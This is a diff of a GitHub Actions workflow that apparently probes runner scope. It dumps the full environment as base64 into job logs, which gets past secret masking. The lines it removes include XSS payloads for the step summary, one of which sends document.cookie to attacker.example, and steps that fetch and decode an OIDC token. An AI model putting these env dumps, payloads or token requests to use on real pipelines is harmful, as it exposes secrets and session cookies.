@@ -1,71 +1,38 @@
-name: MultiProbe
+name: RuntimeScopeTest
 on:
   push:
     branches: [main]
 permissions:
   contents: read
   id-token: write
-  actions: write
 
 jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - name: Step 1 - env before any uses action
+      - name: Env before artifact upload
         run: |
-          echo "=ENV_BEFORE_B64="
+          echo "=BEFORE_B64="
           env | base64 -w0
           echo ""
-          echo "=ENV_BEFORE_END="
+          echo "=BEFORE_END="
+          echo "RT_LEN=${#ACTIONS_RUNTIME_TOKEN}"
+          echo "RT_URL=$ACTIONS_RUNTIME_URL"
 
-      - name: Create artifact file
-        run: echo "probe-$(date +%s)" > /tmp/probe.txt
+      - name: Create file
+        run: echo "test" > /tmp/t.txt
 
-      - name: Upload artifact (triggers ACTIONS_RUNTIME_TOKEN)
+      - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: probe-artifact
-          path: /tmp/probe.txt
+          name: scope-test
+          path: /tmp/t.txt
 
-      - name: Step 2 - env AFTER upload-artifact
+      - name: Env after artifact upload
         run: |
-          echo "=ENV_AFTER_B64="
+          echo "=AFTER_B64="
           env | base64 -w0
           echo ""
-          echo "=ENV_AFTER_END="
-          echo "RUNTIME_URL=$ACTIONS_RUNTIME_URL"
-          echo "RUNTIME_TOKEN_LEN=${#ACTIONS_RUNTIME_TOKEN}"
-
-      - name: Step summary HTML injection test
-        run: |
-          {
-            echo "# Test"
-            printf '<script>document.title="XSS_GITHUB_ACTIONS"</script>'
-            printf '\n'
-            printf '<img src=x onerror=alert(document.domain)>'
-            printf '\n'
-            printf '<svg onload=alert(1)><rect/></svg>'
-            printf '\n'
-            printf '<details open ontoggle=fetch("https://attacker.example/?" + document.cookie)><summary>!</summary></details>'
-            printf '\n'
-          } >> "$GITHUB_STEP_SUMMARY"
-
-      - name: OIDC claims for push trigger
-        run: |
-          T=$(curl -sf \
-            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "
-import json,sys
-print(json.load(sys.stdin).get('value','ERR'))
-")
-          echo "$T" | cut -d. -f2 | python3 -c "
-import sys,base64,json
-p=sys.stdin.read().strip()
-p+='='*(-len(p)%4)
-d=json.loads(base64.b64decode(p))
-print('sub:', d.get('sub'))
-print('ref:', d.get('ref'))
-print('event_name:', d.get('event_name'))
-print('workflow_ref:', d.get('workflow_ref'))
-print('runner_env:', d.get('runner_environment'))
-"
+          echo "=AFTER_END="
+          echo "RT_LEN_AFTER=${#ACTIONS_RUNTIME_TOKEN}"
+          echo "RT_URL_AFTER=$ACTIONS_RUNTIME_URL"
